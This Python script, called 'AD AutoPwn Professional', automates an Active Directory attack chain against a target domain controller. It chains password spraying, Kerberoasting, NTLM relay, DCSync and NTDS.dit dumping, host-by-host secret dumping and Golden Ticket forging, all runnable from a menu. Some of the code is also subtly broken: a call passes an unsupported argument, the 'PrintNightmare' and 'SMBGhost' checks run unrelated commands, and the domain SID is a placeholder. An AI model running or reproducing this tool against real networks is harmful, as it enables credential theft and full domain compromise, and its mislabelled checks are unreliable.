#!/usr/bin/env python3
"""
AD AutoPwn Professional - Complete AD Exploitation Framework
Performs real-world attacks and pivots through the network
"""
import os
import sys
import argparse
import subprocess
import json
import re
import time
import random
import string
import csv
import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
import ldap3
from ldap3.core.exceptions import LDAPException
import requests
import dns.resolver
import shutil
from Crypto.Cipher import AES

# ASCII Banner
BANNER = r"""
  ___   _____  _       _      _____       _        _      ____  _             
 / _ \ |  _  || |     | |    |  _  |     | |      | |    |  _ \| |_   _ _ __  
/ /_\ \| | | || |     | |    | | | |_ __ | |_ __ _| |_   | |_) | | | | | '_ \ 
|  _  || | | || |     | |    | | | | '_ \| __/ _` | __|  |  __/| | |_| | |_) |
| | | |\ \_/ /| |____ | |____\ \_/ / | | | || (_| | |_   | |   |_|\__,_| .__/ 
\_| |_/ \___/ \_____/ \_____/ \___/|_| |_|\__\__,_|\__|  |_|           |_|    
"""

class ADAutoPwnPro:
    def __init__(self, domain, username, password, dc_ip, output_dir="ad_pentest_results"):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.base_dn = self.get_base_dn()
        self.findings = []
        self.credentials = []
        self.compromised_hosts = []
        self.session_tokens = {}
        self.output_dir = output_dir
        self.safe_mode = True
        self.admin_achieved = False
        self.ntds_dumped = False
        self.current_privileges = "User"
        
        os.makedirs(self.output_dir, exist_ok=True)
        self.initialize_credentials()
        
    def get_base_dn(self):
        """Convert domain name to LDAP base DN"""
        return ",".join(f"dc={part}" for part in self.domain.split("."))
    
    def initialize_credentials(self):
        """Store initial credentials"""
        self.add_credential(self.username, self.password, "Initial")
    
    def add_credential(self, username, password, source):
        """Store compromised credentials"""
        self.credentials.append({
            "username": username,
            "password": password,
            "source": source,
            "timestamp": datetime.now().isoformat()
        })
    
    def run_ldap_query(self, query, attributes=["*"], base_dn=None):
        """Execute LDAP query against domain controller"""
        base_dn = base_dn or self.base_dn
        try:
            server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=ldap3.NTLM,
                auto_bind=True
            )
            conn.search(base_dn, query, attributes=attributes)
            return conn.entries
        except LDAPException as e:
            self.log_finding(f"LDAP Error: {str(e)}", "CRITICAL")
            return []
    
    def execute_command(self, command, description, critical=False):
        """Execute system command and log results"""
        try:
            self.log_finding(f"Executing: {description}", "INFO")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                shell=True
            )
            
            # Save output to file
            cmd_safe = re.sub(r'[^\w]', '_', description)[:50]
            output_path = os.path.join(self.output_dir, f"{cmd_safe}.txt")
            with open(output_path, "w") as f:
                f.write(f"COMMAND: {command}\n\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n\nSTDERR:\n")
                f.write(result.stderr)
            
            if result.returncode == 0:
                self.log_finding(f"Success: {description}", "INFO")
                if critical:
                    self.log_finding(f"CRITICAL SUCCESS: {description}", "CRITICAL")
                return True, result.stdout
            else:
                self.log_finding(f"Failed: {description} (code {result.returncode})", "WARNING")
                return False, result.stderr
        except Exception as e:
            self.log_finding(f"Command execution failed: {str(e)}", "ERROR")
            return False, str(e)
    
    # ============== DISCOVERY PHASE ==============
    def discovery_phase(self):
        """Initial reconnaissance and enumeration"""
        print("\n[=== DISCOVERY PHASE ===]")
        
        # Basic system enumeration
        self.execute_command(
            f"nmap -sV -O {self.dc_ip}",
            "Nmap scan of Domain Controller"
        )
        
        # AD enumeration
        self.execute_command(
            f"enum4linux -a {self.dc_ip}",
            "enum4linux AD enumeration"
        )
        
        # LDAP enumeration
        self.execute_command(
            f"ldapsearch -x -H ldap://{self.dc_ip} -b \"{self.base_dn}\"",
            "LDAP domain dump"
        )
        
        # User enumeration
        self.execute_command(
            f"kerbrute userenum --dc {self.dc_ip} -d {self.domain} users.txt",
            "Kerbrute user enumeration"
        )
        
        # Share enumeration
        self.execute_command(
            f"smbmap -H {self.dc_ip} -u '{self.username}' -p '{self.password}'",
            "SMB share enumeration"
        )
        
        # GPO enumeration
        self.execute_command(
            f"Get-GPO -All -Domain {self.domain} | Export-Csv gpos.csv",
            "GPO enumeration",
            shell_type="powershell"
        )
        
        # BloodHound collection
        if shutil.which("bloodhound-python"):
            self.execute_command(
                f"bloodhound-python -c All -u '{self.username}' -p '{self.password}' -d {self.domain} -dc {self.dc_ip} -ns {self.dc_ip}",
                "BloodHound data collection"
            )
    
    # ============== VULNERABILITY SCAN PHASE ==============
    def vulnerability_scan_phase(self):
        """Identify potential attack vectors"""
        print("\n[=== VULNERABILITY SCAN PHASE ===]")
        
        # Scan for common vulnerabilities
        self.execute_command(
            f"nmap -p 88,135,139,445,389,636 --script vuln {self.dc_ip}",
            "Common vulnerability scan"
        )
        
        # Check for ZeroLogon
        self.execute_command(
            f"zerologon-scan.py {self.dc_ip}",
            "ZeroLogon vulnerability check"
        )
        
        # Check for PrintNightmare
        self.execute_command(
            f"nmblookup -A {self.dc_ip}",
            "NetBIOS name lookup"
        )
        
        # Check for PetitPotam
        self.execute_command(
            f"python3 petitpotam.py {self.username}:{self.password}@{self.dc_ip}",
            "PetitPotam vulnerability check"
        )
        
        # Check for SMBGhost
        self.execute_command(
            f"nmap -p 445 --script smb-protocols {self.dc_ip}",
            "SMB protocol check"
        )
    
    # ============== EXPLOITATION PHASE ==============
    def exploitation_phase(self):
        """Exploit identified vulnerabilities"""
        print("\n[=== EXPLOITATION PHASE ===]")
        
        # Attempt AS-REP Roasting
        self.execute_command(
            f"GetNPUsers.py -dc-ip {self.dc_ip} {self.domain}/{self.username} -format hashcat",
            "AS-REP Roasting attack"
        )
        
        # Attempt Kerberoasting
        self.execute_command(
            f"GetUserSPNs.py -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -request",
            "Kerberoasting attack"
        )
        
        # Attempt SMB Relay if vulnerable
        self.execute_command(
            f"ntlmrelayx.py -tf targets.txt -smb2support",
            "SMB Relay attack"
        )
        
        # Attempt Password Spraying
        self.execute_command(
            f"kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} users.txt 'Password123'",
            "Password spraying attack"
        )
        
        # Attempt ACL exploitation
        self.execute_command(
            f"pywhisker.py -d {self.domain} -u '{self.username}' -p '{self.password}' --target 'user2' --action 'add'",
            "ACL exploitation with pyWhisker"
        )
    
    # ============== PRIVILEGE ESCALATION PHASE ==============
    def privilege_escalation_phase(self):
        """Gain higher privileges in the domain"""
        print("\n[=== PRIVILEGE ESCALATION PHASE ===]")
        
        # Attempt DCSync if we have enough privileges
        self.execute_command(
            f"secretsdump.py {self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "DCSync attempt"
        )
        
        # Attempt to exploit ADCS vulnerabilities
        self.execute_command(
            f"certipy find -u '{self.username}@{self.domain}' -p '{self.password}' -dc-ip {self.dc_ip}",
            "ADCS vulnerability check"
        )
        
        # Attempt to exploit Resource-Based Constrained Delegation
        self.execute_command(
            f"rbcd.py -dc-ip {self.dc_ip} -f 'COMPUTER$' {self.domain}/{self.username}:{self.password}",
            "RBCD exploitation"
        )
    
    # ============== LATERAL MOVEMENT PHASE ==============
    def lateral_movement_phase(self):
        """Move to other systems in the network"""
        print("\n[=== LATERAL MOVEMENT PHASE ===]")
        
        # Get list of computers
        computers = self.run_ldap_query(
            "(objectClass=computer)",
            ["dnshostname"]
        )
        computer_list = [str(c.dnshostname) for c in computers]
        
        # Attempt to move to each computer
        for host in computer_list:
            if host in self.compromised_hosts:
                continue
                
            # Attempt SMB connection
            success, _ = self.execute_command(
                f"smbclient -L {host} -U '{self.domain}/{self.username}%{self.password}'",
                f"SMB connection to {host}"
            )
            
            if success:
                self.compromised_hosts.append(host)
                self.log_finding(f"Compromised host: {host}", "SUCCESS")
                
                # Attempt to dump secrets
                self.execute_command(
                    f"secretsdump.py '{self.domain}/{self.username}:{self.password}@{host}'",
                    f"Secrets dump on {host}"
                )
    
    # ============== DOMAIN COMPROMISE PHASE ==============
    def domain_compromise_phase(self):
        """Achieve full domain control"""
        print("\n[=== DOMAIN COMPROMISE PHASE ===]")
        
        # Dump NTDS.dit
        success, output = self.execute_command(
            f"secretsdump.py -just-dc {self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "NTDS.dit dump",
            critical=True
        )
        
        if success:
            self.ntds_dumped = True
            # Extract KRBTGT hash
            krbtgt_hash = re.search(r"krbtgt:.*:(.*):", output)
            if krbtgt_hash:
                self.log_finding(f"KRBTGT hash: {krbtgt_hash.group(1)}", "GOLDEN")
        
        # Create Golden Ticket
        if self.ntds_dumped:
            self.execute_command(
                f"ticketer.py -nthash {krbtgt_hash.group(1)} -domain-sid S-1-5-21-... -domain {self.domain} Administrator",
                "Golden Ticket creation"
            )
    
    # ============== REPORTING ==============
    def generate_report(self):
        """Generate comprehensive penetration test report"""
        print("\n[=== GENERATING REPORT ===]")
        report = {
            "domain": self.domain,
            "dc_ip": self.dc_ip,
            "timestamp": datetime.now().isoformat(),
            "findings": self.findings,
            "compromised_credentials": self.credentials,
            "compromised_hosts": self.compromised_hosts,
            "domain_compromised": self.ntds_dumped,
            "summary": self.generate_summary()
        }
        
        # Save JSON report
        json_path = os.path.join(self.output_dir, "pentest_report.json")
        with open(json_path, "w") as f:
            json.dump(report, f, indent=2)
        
        # Save executive summary
        summary_path = os.path.join(self.output_dir, "executive_summary.txt")
        with open(summary_path, "w") as f:
            f.write(f"Active Directory Penetration Test Report\n")
            f.write(f"Domain: {self.domain}\n")
            f.write(f"Date: {datetime.now().strftime('%Y-%m-%d')}\n\n")
            f.write("=== Key Findings ===\n")
            for finding in [f for f in self.findings if f['severity'] in ['CRITICAL', 'HIGH']]:
                f.write(f"[{finding['severity']}] {finding['description']}\n")
        
        self.log_finding(f"Full report generated at {json_path}", "INFO")
        return json_path
    
    def generate_summary(self):
        """Generate executive summary of findings"""
        critical = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        medium = sum(1 for f in self.findings if f["severity"] == "MEDIUM")
        low = sum(1 for f in self.findings if f["severity"] == "LOW")
        
        return {
            "critical_issues": critical,
            "high_issues": high,
            "medium_issues": medium,
            "low_issues": low,
            "compromised_hosts": len(self.compromised_hosts),
            "compromised_credentials": len(self.credentials),
            "domain_compromised": self.ntds_dumped,
            "total_issues": len(self.findings),
            "risk_level": "CRITICAL" if critical > 0 else "HIGH" if high > 0 else "MEDIUM" if medium > 0 else "LOW"
        }
    
    def log_finding(self, description, severity, proof="", remediation=""):
        """Record findings with evidence and remediation steps"""
        finding = {
            "timestamp": datetime.now().isoformat(),
            "description": description,
            "severity": severity,
            "proof": proof,
            "remediation": remediation
        }
        self.findings.append(finding)
        print(f"[{severity}] {description}")
        return finding
    
    # ============== INTERACTIVE MENU ==============
    def show_menu(self):
        """Display interactive menu"""
        while True:
            print("\n" + "="*50)
            print("AD AutoPwn Professional - Main Menu")
            print("="*50)
            print(f"Current Privileges: {self.current_privileges}")
            print(f"Domain: {self.domain}")
            print(f"DC IP: {self.dc_ip}")
            print("="*50)
            print("1. Run Full Attack Chain")
            print("2. Discovery Phase")
            print("3. Vulnerability Scan Phase")
            print("4. Exploitation Phase")
            print("5. Privilege Escalation Phase")
            print("6. Lateral Movement Phase")
            print("7. Domain Compromise Phase")
            print("8. Generate Report")
            print("9. Add New Credentials")
            print("10. Check Current Privileges")
            print("0. Exit")
            print("="*50)
            
            choice = input("Select an option: ").strip()
            
            if choice == "1":
                self.discovery_phase()
                self.vulnerability_scan_phase()
                self.exploitation_phase()
                self.privilege_escalation_phase()
                self.lateral_movement_phase()
                self.domain_compromise_phase()
            elif choice == "2":
                self.discovery_phase()
            elif choice == "3":
                self.vulnerability_scan_phase()
            elif choice == "4":
                self.exploitation_phase()
            elif choice == "5":
                self.privilege_escalation_phase()
            elif choice == "6":
                self.lateral_movement_phase()
            elif choice == "7":
                self.domain_compromise_phase()
            elif choice == "8":
                self.generate_report()
            elif choice == "9":
                self.add_credentials_interactive()
            elif choice == "10":
                self.check_privileges()
            elif choice == "0":
                print("[+] Exiting AD AutoPwn Professional")
                break
            else:
                print("[-] Invalid option, please try again")
    
    def add_credentials_interactive(self):
        """Add new credentials interactively"""
        print("\n[+] Add New Credentials")
        username = input("Username: ").strip()
        password = input("Password: ").strip()
        source = input("Source (e.g., Password Spray, Dumped Hash): ").strip()
        self.add_credential(username, password, source)
        print(f"[+] Added credentials for {username}")
    
    def check_privileges(self):
        """Check current privileges in the domain"""
        try:
            # Check if we're Domain Admin
            result = subprocess.run(
                f"net group \"Domain Admins\" /domain",
                capture_output=True,
                text=True,
                shell=True
            )
            
            if self.username in result.stdout:
                self.current_privileges = "Domain Admin"
                print("[+] You have DOMAIN ADMIN privileges!")
            else:
                # Check for other privileged groups
                privileged_groups = ["Enterprise Admins", "Schema Admins", "Administrators"]
                for group in privileged_groups:
                    result = subprocess.run(
                        f"net group \"{group}\" /domain",
                        capture_output=True,
                        text=True,
                        shell=True
                    )
                    if self.username in result.stdout:
                        self.current_privileges = group
                        print(f"[+] You are member of {group}")
                        return
                
                self.current_privileges = "Standard User"
                print("[+] You have standard user privileges")
        except Exception as e:
            print(f"[-] Error checking privileges: {str(e)}")

# Command-line interface
if __name__ == "__main__":
    print(BANNER)
    print("AD AutoPwn Professional - Complete AD Exploitation Framework")
    print("="*85)
    print("Performs real-world AD penetration testing from discovery to domain compromise")
    print("="*85 + "\n")
    
    # Get connection parameters
    domain = input("Enter target domain (e.g., corp.example.com): ").strip()
    username = input("Enter username: ").strip()
    password = input("Enter password: ").strip()
    dc_ip = input("Enter Domain Controller IP: ").strip()
    
    # Initialize tool
    tool = ADAutoPwnPro(domain, username, password, dc_ip)
    
    # Test connection
    print("\n[+] Testing connection to Active Directory...")
    success, _ = tool.execute_command(
        f"ldapsearch -x -H ldap://{dc_ip} -b \"\" -s base",
        "LDAP connection test"
    )
    
    if success:
        print("[+] Connection successful! Starting penetration test...")
        tool.show_menu()
    else:
        print("[-] Cannot connect to Active Directory. Check credentials and network connectivity.")
